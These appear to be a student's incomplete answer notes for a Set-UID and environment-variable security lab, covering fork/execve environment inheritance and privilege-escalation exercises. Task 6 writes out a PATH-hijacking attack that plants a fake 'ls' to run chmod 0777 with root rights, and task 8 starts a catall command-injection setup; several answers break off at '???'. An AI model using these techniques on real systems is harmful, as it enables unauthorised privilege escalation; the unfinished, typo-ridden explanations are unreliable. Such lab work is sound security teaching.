TASK 2:
step 3 - Since the two files are identical when compared with the diff command, this means that the child process inherited the same environment as the parent process at the moment of the fork() call.

TASK 3:
step 3 - The new program receives its environment variables from the third argument passed to execve().
When environ is passed, the new program inherits the environment of the process that executed it.
When NULL is passed instead, the new program starts with an empty environment, so /usr/bin/env prints nothing.

TASK 5:
step 3 - When I exported ANY_NAME=this_name (and other variables) and then ran the Set-UID program, the program printed ANY_NAME=this_name along with PATH, HOME, USER, and other variables.
The SET_UID program the calling process's environment, but the system's secure execution policy prevents untrusted environment variables such as LD_LIBRARY_PATH from influencing privileged execution.

TASK 6:
After compiling the program and following the steps from the previous task to change its owner to root, and make it a Set-UID program with the following instructions:

   $ gcc mynewset.c (name of the program)
   $ sudo chown root a.out (changing the exacutable output of the program to root)
   $ sudo chmod 4755 a.out (making it a SET-UID program)

A new directory needs to be created. Here I chose the name malicious, and put it in front of PATH:

   $ mkdir -p ~/malicious
   $ export PATH="$HOME/malicious:$PATH"

And created a file than will receive the root priprogram called ls.c inside said directory with the code:

"#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
	system("chmod 0777 /home/seed/malicious/file");
	return 0;
}"

ls.c then needs to be compiled:
   $ gcc ~/malicious/ls.c -o ~/malicious/ls

???

TASK 8:
step 1 - Like the previous task, we'll run the program catall.c, change its owner to root, and make it a Set-UID program with the following instructions:

   $ gcc catall.c -o catall
   $ sudo chown root catall
   $ sudo chmod 4755 catall

We can now create a non-writable, root-owned file to test out code, with the following command:

 $ sudo sh -c 'echo "lab test" > /tmp/lab_test_file && chown root:root /tmp/lab_test_file && chmod 644 /tmp/lab_test_file'
 ???

